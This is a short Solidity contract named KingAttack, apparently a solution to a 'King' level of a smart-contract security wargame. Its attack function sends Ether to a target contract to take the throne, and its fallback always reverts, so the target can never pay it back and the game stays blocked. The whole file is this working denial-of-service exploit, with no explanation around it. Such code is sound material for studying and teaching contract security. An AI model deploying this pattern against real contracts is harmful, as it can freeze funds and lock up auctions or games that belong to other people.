// SPDX-License-Identifier: MIT
pragma solidity 0.8.14;

contract KingAttack {

    function attack(address payable _to) public payable {
        (bool sent,) = _to.call{value: msg.value}("");
        require(sent, "Failed to send Ether");
    }

    fallback() external payable {
        revert();
    }
}